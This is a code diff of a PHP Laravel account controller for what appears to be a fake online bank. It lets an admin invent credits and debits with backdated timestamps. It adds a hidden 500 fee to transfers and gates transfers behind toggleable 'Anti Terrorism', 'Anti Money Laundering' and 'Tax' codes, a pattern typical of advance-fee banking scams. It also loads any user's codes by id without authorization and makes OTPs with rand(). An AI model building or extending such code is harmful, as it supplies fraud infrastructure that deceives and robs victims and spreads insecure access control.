@@ -31,15 +31,15 @@ class AccountController extends Controller
         $account = Account::where('user_id', $user->id)->first();
         return view('users.transfer', compact('account', 'user'));
     }
-    public function codes()
+    public function codes($id)
     {
-        $user = Auth::user();
+        $user = User::findorfail($id);
         $account = Account::where('user_id', $user->id)->first();
         return view('admin.account.codes', compact('account', 'user'));
     }
-    public function ViewCodes()
+    public function ViewCodes($id)
     {
-        $user = Auth::user();
+        $user = User::findorfail($id);
         $account = Account::where('user_id', $user->id)->first();
         return view('admin.account.ViewCodes', compact('account', 'user'));
     }
@@ -142,12 +142,18 @@ class AccountController extends Controller
     public function adddebit(Request $request)
     {
         $account = Account::find($request->account_id);
+        if ($account->balance < $request->amount) {
+            return redirect()->route('admin.account.debit', $account->id)->with('error', 'Insufficient balance');
+        }
         $account->balance = $account->balance - $request->amount;
         $account->save();
         $debit = new Debits();
         $debit->account_id = $request->account_id;
         $debit->user_id = $account->user_id;
         $debit->amount = $request->amount;
+        $debit->transaction_reference = "BCPN" .  random_int(1000, 999999) . "- DEBIT";
+        $debit->description = $request->description;
+        $debit->created_at = $request->created_at;
         $debit->save();
         return redirect()->route('admin.account.index')->with('success', 'Amount debited successfully');
     }
@@ -157,11 +163,14 @@ class AccountController extends Controller
         $account = Account::find($request->account_id);
         $account->balance = $account->balance + $request->amount;
         $account->save();
-        $debit = new Deposit();
-        $debit->account_id = $request->account_id;
-        $debit->user_id = $account->user_id;
-        $debit->amount = $request->amount;
-        $debit->save();
+        $Deposit = new Deposit();
+        $Deposit->account_id = $request->account_id;
+        $Deposit->user_id = $account->user_id;
+        $Deposit->amount = $request->amount;
+        $Deposit->transaction_reference = "BCPN" .  random_int(1000, 999999) . "- CREDIT";
+        $Deposit->description = $request->description;
+        $Deposit->created_at = $request->created_at;
+        $Deposit->save();
         return redirect()->route('admin.account.index')->with('success', 'Amount debited successfully');
     }
 
@@ -262,8 +271,21 @@ class AccountController extends Controller
         $moneyTransfer->amount = $request->transferamount + 500;
         $moneyTransfer->currency = 'USD';
         $moneyTransfer->status = 'initiated';
+        $moneyTransfer->description = $request->description;
+        $moneyTransfer->recepient_address = $request->address;
         $moneyTransfer->save();
 
+        if ($account->enableCodes == 0) {
+            $otp = rand(1000, 9999);
+            $account->emailotp = $otp;
+            $account->update();
+            $mailData = [
+                'title' => 'You initiated a transfer',
+                'body' => 'Your OTP is : ' . $otp
+            ];
+            Mail::to($user->email)->send(new OtpMail($mailData));
+            return view('users.email', compact('user', 'account', 'moneyTransfer'));
+        }
         return view('users.otp1', compact('user', 'account', 'moneyTransfer'));
     }
     public function otp1(Request $request)
@@ -276,7 +298,7 @@ class AccountController extends Controller
         } else {
             $moneyTransfer->status = 'failed';
             $moneyTransfer->save();
-            return redirect()->route('Account_transfers_new')->with('error', 'Invalid OTP 1');
+            return redirect()->route('Account_transfers_new')->with('error', 'Invalid Anti Terrorism code');
         }
     }
     public function otp2(Request $request)
@@ -289,7 +311,7 @@ class AccountController extends Controller
         } else {
             $moneyTransfer->status = 'failed';
             $moneyTransfer->save();
-            return redirect()->route('Account_transfers_new')->with('error', 'Invalid OTP 2');
+            return redirect()->route('Account_transfers_new')->with('error', 'Invalid Anti Money Laundering code');
         }
     }
     public function otp3(Request $request)
@@ -310,7 +332,7 @@ class AccountController extends Controller
         } else {
             $moneyTransfer->status = 'failed';
             $moneyTransfer->save();
-            return redirect()->route('Account_transfers_new')->with('error', 'Invalid OTP 3');
+            return redirect()->route('Account_transfers_new')->with('error', 'Invalid Tax code');
         }
     }
     public function emailotp(Request $request)
@@ -344,6 +366,8 @@ class AccountController extends Controller
         $debit->account_id = $account->id;
         $debit->user_id = $account->user_id;
         $debit->amount = $moneyTransfer->amount;
+        $debit->transaction_reference = "BCPN" .  random_int(1000, 999999) . "- DEBIT";
+        $debit->description = $moneyTransfer->description;
         $debit->save();
         return view('users.transferConfirm', compact('user', 'account', 'moneyTransfer'));
     }
@@ -373,10 +397,27 @@ class AccountController extends Controller
         $account = Account::find($user->account->id);
         return view('users.loansAdd', compact('user', 'account'));
     }
-    public function admin_transfers(){
+    public function admin_transfers()
+    {
         $user = Auth::user();
         $account = Account::find($user->account->id);
         $moneyTransfers = MoneyTransfer::paginate(10);
         return view('admin.transfer.index', compact('user', 'account', 'moneyTransfers'));
+    }
+
+
+    public function disableCodes($id)
+    {
+        $account = Account::find($id);
+        $account->enableCodes = 0;
+        $account->save();
+        return redirect()->route('admin.account.index')->with('success', 'Codes has been disabled');
+    }
+    public function enableCodes($id)
+    {
+        $account = Account::find($id);
+        $account->enableCodes = 1;
+        $account->save();
+        return redirect()->route('admin.account.index')->with('success', 'Codes has been enabled');
     }
 }
